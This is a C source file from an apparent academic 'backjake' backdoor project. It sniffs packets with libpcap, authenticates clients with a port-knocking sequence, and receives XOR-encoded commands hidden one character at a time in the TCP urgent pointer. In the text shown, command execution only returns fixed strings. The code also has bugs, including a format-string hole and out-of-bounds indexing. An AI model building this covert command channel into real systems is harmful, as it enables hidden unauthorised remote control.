/*-----------------------------------------------------------------------------------------------
--	Source File:	pktcap.c - Contains the main datagram receiving functions used by pscan.c
--
--	Functions:	Misc libpcap functions- packet filtering library based on the BSD 
--			packet filter (BPF)
--
--	Interface:	void * ReceiveDatagram (void *pcap_arg)
--				pcap_arg - pointer which will be cast into a pointer to 
--					   struct PcapInfo 
--			    struct PcapInfo: contains all of the packet capture components
--				pcap_t* nic_descr - descriptor to the active NIC
--				bpf_u_int32 netp - address/subnet mask
--				char cmd[MAXLINE] - Packet Filter string to be compiled into the NIC
--
--	Date:		June 24, 2011
--
--	Revisions:	(Date and Description)
--
--	Designer:	Aman Abdulla
--
--	Programmer:	Aman Abdulla
--
--	Notes:
--	This function will use the address and filter string and use them in the pcap_compile() and 
-- 	pcap_setfilter() functions to selectively capture packets of interest. It then invokes 
--	the main callback function to start the packet capture loop.
--
--
--	
-------------------------------------------------------------------------------------------------*/
#include "backjake.h"

static int i = 0;
int auth[3] = {0};
int tries[10] = {0};
int fails = 0;
char command[64] = {0};
void * addr_ptr;

static void endProgram (int signo);

/*------------------------------------------------------------------------------
--
--  FUNCTION:   ReceiveDatagram
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  ReceiveDatagram (void *pcap_arg)
--                          pcap_arg - pointer to pcap struct
--
--  RETURNS:    void * - null in this case
--
--  NOTES:      a thread that reads in packets on the server end
--  
------------------------------------------------------------------------------*/
void* ReceiveDatagram (void *pcap_arg)
{ 
	struct bpf_program fp;
	PcapInfo *pcap_ptr = (PcapInfo *)pcap_arg;
		
	pcapCompile(pcap_ptr, &fp);
	pcapFilter(pcap_ptr, &fp);
	pcapListen(pcap_ptr);

	return NULL;
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   startServer
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  void startServer(void* Addr_Ptr, void* pcap_ptr, pthread_t *ThreadID2)
--                          Addr_Ptr    - a pointer to the address structure
--                          pcap_ptr    - pointer to the pcap structure
--                          ThreadID2   - the id of the thread for recieving 
--
--  RETURNS:    void
--
--  NOTES:      starts the server, opening the recieving threads
--  
------------------------------------------------------------------------------*/
void startServer(void* Addr_Ptr, void* pcap_ptr, pthread_t *ThreadID2)
{
	addr_ptr = Addr_Ptr;
    pthread_create (ThreadID2, NULL, ReceiveDatagram, (void *)pcap_ptr);
    pthread_join (*ThreadID2, NULL);
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   setupSignals
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  void setupSignals()
--
--  RETURNS:    void
--
--  NOTES:      sets up the signal so the program can be ended with ctrl-C
--  
------------------------------------------------------------------------------*/
void setupSignals()
{
    if (signal(SIGINT, endProgram) == SIG_ERR)
        perror("signal(SIGINT) error");    
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   pcapListen
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  void pcapListen(PcapInfo * pcap_ptr)
--                      pcap_ptr - pointer to the pcap struct
--
--  RETURNS:    void
--
--  NOTES:      starts the listening at the card level
--  
------------------------------------------------------------------------------*/
void pcapListen(PcapInfo * pcap_ptr)
{
	void *status = NULL;

	pcap_loop (pcap_ptr->nic_descr, -1, packetHandler, NULL);

	if (ExitFlag == TRUE)
	{
		pthread_exit (status);
	}
	
	exit (0);
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   pcapCompile
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  void pcapCompile(PcapInfo * pcap_ptr, struct bpf_program * fp)
--              		pcap_ptr - pointer to the pcap struct
--						fp 		 - the program itself
--
--  RETURNS:    void
--
--  NOTES:      compiles the command to the card
--  
------------------------------------------------------------------------------*/
void pcapCompile(PcapInfo * pcap_ptr, struct bpf_program * fp)
{
	if(pcap_compile (pcap_ptr->nic_descr, fp, pcap_ptr->cmd, 0, pcap_ptr->netp) == -1)
	{ 
		fprintf(stderr,"Error calling pcap_compile\n"); 
		exit(1); 
	}
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   pcapFilter
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  void pcapFilter(PcapInfo * pcap_ptr, struct bpf_program * fp)
--              		pcap_ptr - pointer to the pcap struct
--						fp 		 - the program itself
--
--  RETURNS:    void
--
--  NOTES:      sets the filter for the pcap section
--  
------------------------------------------------------------------------------*/
void pcapFilter(PcapInfo * pcap_ptr, struct bpf_program * fp)
{
	if (pcap_setfilter(pcap_ptr->nic_descr, fp) == -1)
	{ 
		fprintf(stderr,"Error setting filter\n"); 
		exit(1); 
	}
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   checkPacketSize
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  int checkPacketSize()
--
--  RETURNS:    the size of the IP packet
--
--  NOTES:      returns the packet size
--  
------------------------------------------------------------------------------*/
int checkPacketSize()
{
	return ((sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr)) > 40);
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   packetHandler
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  void packetHandler(u_char *ptr_null, const struct pcap_pkthdr* pkthdr, const u_char* packet)
--                          ptr_null    - pointer to null
--                          pkthdr  	- the packet's header
--							packet 		- the packet itself
--
--  RETURNS:    void
--
--  NOTES:      handles packets at the card level
--  
------------------------------------------------------------------------------*/
void packetHandler(u_char *ptr_null, const struct pcap_pkthdr* pkthdr, const u_char* packet)
{
	struct ethhdr *ethernet_header;
	struct iphdr *ip_header;
	struct tcphdr *tcp_header;

	if (checkPacketSize())
	{
		ethernet_header = (struct ethhdr *)packet;
		if(ntohs(ethernet_header->h_proto) == ETH_P_IP)
		{
			ip_header = (struct iphdr *)(packet + sizeof(struct ethhdr));	
			if(ip_header->protocol == IPPROTO_TCP)
			{
				tcp_header = (struct tcphdr*)(packet + sizeof(struct ethhdr) + ip_header->ihl*4);
				if (server == 1) // if you are the server
				{
					if(authenticated(ip_header->saddr))
					{
						runCommand(decryptPacket(tcp_header));
					} else {
						authenticateClient(ip_header, tcp_header);
					}
				} else { // if you are the client
					printf("%s", decryptPacket(tcp_header));
				}
			}
		}
	}
	ExitFlag = TRUE;
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   decryptPacket
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  char* decryptPacket(struct tcphdr* tcp_header)
--                          tcp_header - the tcp packet header
--
--  RETURNS:    char * returns the decrypted packet
--
--  NOTES:      decrypts the packet for use
--  
------------------------------------------------------------------------------*/
char* decryptPacket(struct tcphdr* tcp_header)
{
	char temp[3] = {0};
	char encodedLetter = 0;
	sprintf(temp, "%c", tcp_header->urg_ptr);
	strcat(command, temp);
	
	encodedLetter = command[length(command)-1];

	if (encodedLetter == 21)
	{
		XOR(command);
		return command;
	}

	return "";
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   runCommand
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  runCommand(char* command)
--					command - the command to run
--
--  RETURNS:    void
--
--  NOTES:      runs the command sent from the client
--  
------------------------------------------------------------------------------*/
void runCommand(char* command)
{
	if (strcmp(command, "") != 0)
		executeCommand(command);
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   authenticated
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  int authenticated(int ip)
--						ip - the address to check against the  authenticated list
--
--  RETURNS:    int - returns 1 if the user is allowed
--
--  NOTES:      calculates the checksum
--  
------------------------------------------------------------------------------*/
int authenticated(int ip)
{
	size_t k = 0;
	for (k = 0; k < (sizeof(auth) / sizeof(int)); k++)
		if (ip == auth[0])
			return 1;
	return 0;
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   PrintInHex
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  int PrintInHex(char *mesg, unsigned char *p, int len)
--					mesg - the message to print
--					p    - where to write from
--					len  - the length of the message
--
--  RETURNS:    unsigned short - the checksum of the packet
--
--  NOTES:      calculates the checksum
--  
------------------------------------------------------------------------------*/
int PrintInHex(char *mesg, unsigned char *p, int len)
{
	printf(mesg);

	while(len--)
	{
		printf("%.2X ", *p);
		p++;
	}
	printf("\n");
	return 0;
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   authenticateClient
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  int authenticateClient(struct iphdr* ip_header, struct tcphdr* tcp_header)
--					ip_header  - the ip header struct
-- 					tcp_header - the tcp header struct
--
--  RETURNS:    int - 1 if the client is authenticated
--
--  NOTES:      checks the knock code and authenticates the client
--  
------------------------------------------------------------------------------*/
int authenticateClient(struct iphdr* ip_header, struct tcphdr* tcp_header)
{
	size_t j = 0;
    size_t temp = sizeof(knockCode) / sizeof(int);
				
	if (i == temp)
	{
		i = 0;
	}

	tries[i++] = (int) ntohs(tcp_header->source);

	for (j=0; j<=temp; j++)
	{
		if(tries[j] != knockCode[j])
		{
			fails++;
			break;
		}

		if (j == temp - 1)
		{
			printf("============ AUTH ============\n"); // change this later
			auth[0] = ip_header->saddr;

			for (j=0; j<=temp; j++)
				tries[j]=0;

			i = 0;
			fails = 0;
			return 1;
		}
	}

	if (fails == temp+1)
	{
		for (j=0; j<=temp; j++)
			tries[j]=0;
		i = 0;
		fails=0;
	}

	return 0;
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   executeCommand
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  void executeCommand(char* command)
--              		command - the command to execute
--
--  RETURNS:    void
--
--  NOTES:      executes the command, then sends the results
--  
------------------------------------------------------------------------------*/
void executeCommand(char* command)
{
	char results[1024] = {0};

	if (strcmp(command, "help") == 0) 
	{
		strcpy(results, "not quite right");
	} else if (strcmp(command, "version") == 0) {
		strcpy(results, "version 1");
	} else if (strcmp(command, "exit") == 0) {
		strcpy(results, "quitting!");
	}
	
	XOR(results);
	sendCommand(addr_ptr, results);
	memset(command, 0, sizeof(command));
	memset(results, 0, sizeof(results));
}

/*------------------------------------------------------------------------------
--
--  FUNCTION:   endProgram
--
--  DATE:       October 5, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner
--
--  INTERFACE:  void endProgram (int signo)
--					signo - the signal number
--
--  RETURNS:    void
--
--  NOTES:      ends the program when ctrl-c is hit.
--  
------------------------------------------------------------------------------*/
static void endProgram (int signo)
{
	exit(1);
}